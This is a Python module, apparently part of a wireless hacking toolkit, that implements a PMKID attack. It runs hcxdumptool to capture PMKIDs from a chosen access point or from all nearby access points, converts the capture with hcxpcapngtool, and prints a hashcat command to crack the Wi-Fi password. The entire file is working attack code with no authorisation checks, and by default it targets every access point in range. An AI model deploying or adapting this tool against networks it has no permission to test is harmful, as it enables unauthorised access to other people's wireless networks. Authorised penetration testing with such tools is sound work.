import os
from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp
from typing import AsyncGenerator


HELP = ToolHelp(
    name="PMKID Attack",
    description=(
        "Captures PMKID from the AP without needing a connected client. "
        "Much faster than handshake capture. Works on most modern routers."
    ),
    usage="Requires: hcxdumptool + hcxtools. Target BSSID optional (scans all if omitted).",
    danger_note="🟠 Medium Risk — sends probe/auth frames to the AP.",
    example="hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=1",
)

DANGER = DangerLevel.ORANGE


class PMKIDAttack:
    def __init__(self, interface: str = "wlan0", output_dir: str = "/tmp"):
        self.interface = interface
        self.output_dir = output_dir
        self._runner = CommandRunner()

    async def capture(
        self,
        bssid: str = "",
        timeout_sec: int = 60,
    ) -> AsyncGenerator[str, None]:
        out_pcap = os.path.join(self.output_dir, "pmkid_capture.pcapng")
        out_hash = os.path.join(self.output_dir, "pmkid.hc22000")

        yield f"[*] Starting PMKID capture on {self.interface}"
        yield f"[*] Output: {out_pcap}"
        if bssid:
            yield f"[*] Targeting: {bssid}"
        else:
            yield "[*] Targeting all nearby APs"

        cmd = [
            "hcxdumptool",
            "-i", self.interface,
            "-o", out_pcap,
            "--enable_status=1",
        ]
        if bssid:
            bssid_clean = bssid.replace(":", "").lower()
            filterfile = os.path.join(self.output_dir, "pmkid_filter.txt")
            with open(filterfile, "w") as f:
                f.write(bssid_clean + "\n")
            cmd += ["--filterlist_ap=" + filterfile, "--filtermode=2"]

        async for line in self._runner.run(cmd):
            if "PMKID" in line:
                yield f"[+] PMKID FOUND: {line}"
            else:
                yield line

    async def convert_to_hashcat(self, pcap_path: str = "") -> AsyncGenerator[str, None]:
        if not pcap_path:
            pcap_path = os.path.join(self.output_dir, "pmkid_capture.pcapng")
        out_hash = os.path.join(self.output_dir, "pmkid.hc22000")

        yield f"[*] Converting {pcap_path} → hashcat format..."
        async for line in CommandRunner().run([
            "hcxpcapngtool",
            "-o", out_hash,
            pcap_path,
        ]):
            yield line
        yield f"[+] Hash file: {out_hash}"
        yield f"[*] Crack with: hashcat -m 22000 {out_hash} wordlist.txt"

    async def stop(self):
        await self._runner.stop()
